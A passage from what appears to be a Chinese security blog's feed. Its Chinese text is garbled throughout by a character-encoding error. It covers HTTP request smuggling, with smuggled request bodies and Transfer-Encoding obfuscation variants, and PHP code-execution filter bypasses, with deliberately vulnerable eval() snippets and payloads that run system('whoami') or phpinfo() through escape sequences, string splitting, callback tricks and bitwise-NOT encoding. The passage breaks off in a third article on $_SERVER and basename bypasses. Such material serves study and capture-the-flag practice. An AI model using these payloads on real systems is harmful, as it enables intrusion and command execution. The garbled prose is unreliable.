class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºè¯»å–å®Œæ¯•ï¼Œè½¬å‘ç»™åç«¯æœåŠ¡å™¨</p><p>åç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthï¼Œè¯»å®Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºè¯·æ±‚ç»“æŸï¼Œåé¢æ•°æ®è®¤ä¸ºæ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>é€ æˆè¯·æ±‚èµ°ç§</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚åŒ…æ—¶ï¼Œå‰åç«¯æœåŠ¡å™¨éƒ½å¤„ç†Transfer-Encodingè¯·æ±‚å¤´ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¯¹å‘é€çš„è¯·æ±‚åŒ…ä¸­çš„Transfer-Encodingè¿›è¡ŒæŸç§æ··æ·†æ“ä½œï¼Œä½¿å¾—å¦ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†TEï¼Œåœ¨æŸç§æ„ä¹‰ä¸Šè¿˜æ˜¯CL-TEæˆ–TE-CL</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹ï¼š</strong></p><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œè¯»åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºç»“æŸï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encoding</p><p>åç«¯æœåŠ¡å™¨è¯»åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5c\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºè¯»å–å®Œæ¯•ï¼Œåé¢æ•°æ®å°±æ˜¯å¦ä¸€ä¸ªè¯·æ±‚</p><p>å…¶ä»–å¯ç”¨äºæ··æ·†çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding[ç©ºæ ¼]: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[ç©ºæ ¼]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><ul><li>ç¦ç”¨ä»£ç†æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨ä¹‹é—´çš„TCPè¿æ¥é‡ç”¨</li><li>ä½¿ç”¨HTTP&#x2F;2åè®®</li><li>å‰åç«¯ä½¿ç”¨ç›¸åŒå‚æ•°</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§&quot; class=&quot;headerlink&quot; title=&quot;ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§&quot;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§&lt;/h1&gt;&lt;p&gt;HTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚</summary>
      
    
    
    
    
    <category term="http" scheme="http://example.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç æ‰§è¡Œç»•è¿‡æ–¹æ³•æ€»ç»“</title>
    <link href="http://example.com/2023/12/21/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/12/21/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2023-12-21T12:20:53.000Z</published>
    <updated>2023-12-21T12:24:39.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œå‡½æ•°"></a>ä»£ç æ‰§è¡Œå‡½æ•°</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string $code):mixed</span><br></pre></td></tr></table></figure><p>å°†codeå½“ä½œphpä»£ç æ‰§è¡Œ</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>php5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion [,string $description]):bool</span><br></pre></td></tr></table></figure><p>php7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion [,Throwable $exception]):bool</span><br></pre></td></tr></table></figure><p>assert()ä¼šæ£€æŸ¥æŒ‡å®šçš„assertionï¼Œå¦‚æœassertionæ˜¯å­—ç¬¦ä¸²ï¼Œå°†ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œ</p><h3 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace()+&#x2F;e"></a>preg_replace()+&#x2F;e</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><p>æœç´¢<strong>subject</strong>ä¸­åŒ¹é…<strong>pattern</strong>çš„éƒ¨åˆ†ï¼Œå¹¶ç”¨replacementæ›¿æ¢ã€‚</p><p>å¦‚æœ<strong>pattern</strong>æ¨¡å¼ä¿®é¥°ç¬¦ä½¿ç”¨**&#x2F;e<strong>ï¼Œé‚£ä¹ˆåŒ¹é…æˆåŠŸå</strong>replacement**ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œ</p><p><img src="/../images/image-20231220221711422.png" alt="image-20231220221711422"></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args, string $code):string</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¼ é€’çš„å‚æ•°åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸ºå…¶è¿”å›å”¯ä¸€çš„åç§°ã€‚</p><p>å¯å¯¹å‚æ•°æˆ–å‡½æ•°ä½“é—­åˆæ³¨å…¥æ¶æ„ä»£ç å¯¼è‡´ä»£ç æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&#x27;echo&#x27;</span>.<span class="variable">$id</span>.<span class="variable">$a</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&quot;;&#125;phpinfo();//</span><br></pre></td></tr></table></figure><h2 id="å¯å›è°ƒå‡½æ•°"><a href="#å¯å›è°ƒå‡½æ•°" class="headerlink" title="å¯å›è°ƒå‡½æ•°"></a>å¯å›è°ƒå‡½æ•°</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , array $array , array ...$arrays ) : array</span><br></pre></td></tr></table></figure><p><strong>array_map()<strong>è¿”å›ä¸€ä¸ª</strong>array</strong>ï¼Œæ•°ç»„å†…å®¹ä¸º<strong>array1</strong>çš„å…ƒç´ æŒ‰ç´¢å¼•é¡ºåºä¸ºå‚æ•°è°ƒç”¨<strong>callback</strong>åçš„ç»“æœ(æœ‰æ›´å¤šæ•°ç»„æ—¶è¿˜ä¼šä¼ å…¥arrays)ï¼Œ<strong>callback</strong>å‡½æ•°å½¢å‚çš„æ•°é‡å¿…é¡»åŒ¹é…**array_map()**å®å‚ä¸­æ•°ç»„çš„æ•°é‡ã€‚</p><p><img src="/../images/image-20231220223642972.png" alt="image-20231220223642972"></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°<strong>callback</strong>æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</p><p><img src="/../images/image-20231220225437826.png" alt="image-20231220225437826"></p><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , array $param_arr ) : mixed</span><br></pre></td></tr></table></figure><p>æŠŠç¬¬ä¸€ä¸ªå‚æ•°å½“ä½œå›è°ƒå‡½æ•°<strong>callback</strong>è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„<strong>param_arr</strong>å½“ä½œå›è°ƒå‡½æ•°çš„å‚æ•°ä¼ å…¥</p><p><img src="/../images/image-20231220225711603.png" alt="image-20231220225711603"></p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡å°†<strong>array</strong>æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ°<strong>callback</strong>å‡½æ•°ï¼Œå¦‚æœ<strong>callback</strong>å‡½æ•°è¿”å›trueï¼Œåˆ™<strong>array</strong>æ•°ç»„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›ç»“æœæ•°ç»„ä¸­ï¼Œæ•°ç»„çš„é”®åä¿æŒä¸å˜ã€‚</p><p><img src="/../images/image-20231220230053947.png" alt="image-20231220230053947"></p><h3 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort ( array &amp;$array , callable $value_compare_func ) : bool</span><br></pre></td></tr></table></figure><p>å°†ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åºã€‚</p><p>å¦‚æœè¦æ’åºçš„æ•°ç»„éœ€è¦ç”¨ä¸€ç§ä¸å¯»å¸¸çš„æ ‡å‡†è¿›è¡Œæ’åºï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨æ­¤å‡½æ•°ã€‚</p><p>php&lt;5.6</p><p><img src="/../images/image-20231221154951752.png" alt="image-20231221154951752"></p><p><strong>php&gt;&#x3D;5.6&amp;php&lt;7  å‚æ•°å˜é•¿ç‰¹æ€§</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221090947163.png" alt="image-20231221090947163"></p><h2 id="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"><a href="#å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"></a>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h2><p><strong>php&gt;&#x3D;7</strong></p><p><strong>é€‚ç”¨äºç»•è¿‡è¿‡æ»¤å…·ä½“å…³é”®å­—</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo|system/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no hack!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221160046354.png" alt="image-20231221160046354"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡"><a href="#å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡"></a>å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡</h2><p><strong>PHP&gt;&#x3D;7</strong></p><p>ä»¥å…«è¿›åˆ¶è¡¨ç¤ºçš„[0-7]{1,3}\è½¬ä¹‰å­—ç¬¦ä¼šè‡ªåŠ¨åŒ¹é…byte(å¦‚â€\400â€&#x3D;&#x3D;â€\000â€)</p><p>ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºçš„\x[0-9A-Fa-f]{1,2}\è½¬ä¹‰å­—ç¬¦è¡¨ç¤ºæ³•(å¦‚â€\41â€)</p><p>ä»¥Unicodeè¡¨ç¤ºçš„\u{[0-9A-Fa-f]+}å­—ç¬¦ï¼Œä¼šè¾“å‡ºUTF-8å­—ç¬¦ä¸²</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();#phpinfo();</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;whoami&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;id&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&quot;\167\150\157\141\155\151&quot;);#system(&#x27;whoami&#x27;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221192218854.png" alt="image-20231221192218854"></p><h2 id="å¤šæ¬¡ä¼ å‚ç»•è¿‡"><a href="#å¤šæ¬¡ä¼ å‚ç»•è¿‡" class="headerlink" title="å¤šæ¬¡ä¼ å‚ç»•è¿‡"></a>å¤šæ¬¡ä¼ å‚ç»•è¿‡</h2><p><strong>è¿‡æ»¤å¼•å·ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?1=system&amp;2=whoami</span><br><span class="line">POSTï¼š</span><br><span class="line">cmd=$_GET[1]($_GET[2]);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221192738080.png" alt="image-20231221192738080"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POSTï¼š</span><br><span class="line">cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221193023823.png" alt="image-20231221193023823"></p><p>å¦‚æœphp&gt;7</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">1=system(&#x27;whoami&#x27;);</span><br><span class="line">POST:</span><br><span class="line">cmd=eval($_GET[1]);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221193244064.png" alt="image-20231221193244064"></p><p>å¦‚æœå›è°ƒå‡½æ•°é™åˆ¶é•¿åº¦ï¼Œåœ¨5.6&lt;php&lt;7ä¸­ï¼š</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?1[]=1&amp;1[]=phpinfo()&amp;2=assert</span><br><span class="line">POST:</span><br><span class="line">cmd=usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221194557136.png" alt="image-20231221194557136"></p><h2 id="å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡"><a href="#å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡" class="headerlink" title="å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡"></a>å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡</h2><p><strong>php&gt;&#x3D;7</strong></p><p><strong>get_defined_functions()</strong>:è¿”å›æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„</p><p>æ³¨æ„ä¸åŒphpç‰ˆæœ¬get_defined_functions()è¿”å›å€¼ä¸åŒ</p><p>è¿™é‡Œä»¥<strong>php7.4.3</strong>ä¸ºä¾‹</p><p>266-&gt;phpinfo</p><p>358-&gt;system</p><p><img src="/../images/image-20231221195549029.png" alt="image-20231221195549029"></p><p><img src="/../images/image-20231221195729256.png" alt="image-20231221195729256"></p><h2 id="URLç¼–ç ç»•è¿‡"><a href="#URLç¼–ç ç»•è¿‡" class="headerlink" title="URLç¼–ç ç»•è¿‡"></a>URLç¼–ç ç»•è¿‡</h2><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤æ‰€æœ‰å­—æ¯å’Œæ•°å­—ï¼Œåˆ©ç”¨å–åæ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(urlencode(~&#x27;phpinfo&#x27;));</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">phpinfo()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201442771.png" alt="image-20231221201442771"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);</span><br><span class="line">system(whoami)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201612330.png" alt="image-20231221201612330"></p><p>å½“<strong>5&lt;&#x3D;php&lt;&#x3D;7.0.9</strong>æ—¶ï¼Œéœ€è¦å†æ‰§è¡Œä¸€æ¬¡æ„é€ å‡ºæ¥çš„å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">$_=(~&#x27;%9E%8C%8C%9A%8D%8B&#x27;);$__=&#x27;_&#x27;.(~&#x27;%AF%B0%AC%AB&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line">POST:</span><br><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201753001.png" alt="image-20231221201753001"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä»£ç æ‰§è¡Œå‡½æ•°&quot;&gt;&lt;a href=&quot;#ä»£ç æ‰§è¡Œå‡½æ•°&quot; class=&quot;headerlink&quot; title=&quot;ä»£ç æ‰§è¡Œå‡½æ•°&quot;&gt;&lt;/a&gt;ä»£ç æ‰§è¡Œå‡½æ•°&lt;/h2&gt;&lt;h3 id=&quot;eval&quot;&gt;&lt;a href=&quot;#eval&quot; class=&quot;headerlink&quot; title=&quot;e</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>$_SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡</title>
    <link href="http://example.com/2023/12/19/post/"/>
    <id>http://example.com/2023/12/19/post/</id>
    <published>2023-12-19T11:15:31.000Z</published>
    <updated>2023-12-19T11:16:33.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡"><a href="#SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡" class="headerlink" title="$_SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡"></a>$_SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡</h1><h2 id="SERVERå‚æ•°"><a href="#SERVERå‚æ•°" class="headerlink" title="$_SERVERå‚æ•°"></a>$_SERVERå‚æ•°</h2><p>$_SERVERæ˜¯PHPé¢„å®šä¹‰å˜é‡ä¹‹ä¸€ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒ…å«äº†æ³¨å…¥å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)åŠè„šæœ¬ä½ç½®(script location)ä¿¡æ¯çš„æ•°ç»„ã€‚</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://aaa.com/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure><p><strong>$_SERVER[â€˜PHP_SELFâ€™]å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å:</strong></p><p>php&#x2F;index.php&#x2F;test&#x2F;foo</p><p><strong>$_SERVER[â€˜REQUEST_URIâ€™]URIç”¨æ¥æŒ‡å®šè¦è®¿é—®çš„é¡µé¢:</strong> </p><p>php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root</p><p>å¹¶ä¸”$_SERVER[â€˜REQUEST_URIâ€™]$_SERVER[â€˜REQUEST_URIâ€™]ä¸ä¼šå°†å‚æ•°ä¸­çš„ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¹¶ä¸ä¼šè¿›è¡ŒURLè§£ç </p><h2 id="basenameå‡½æ•°"><a href="#basenameå‡½æ•°" class="headerlink" title="basenameå‡½æ•°"></a>basenameå‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(path,suffix)</span><br></pre></td></tr></table></figure><p>è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</p><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = <span class="string">&quot;user01/home/documents/geeksforgeeks.php&quot;</span>; 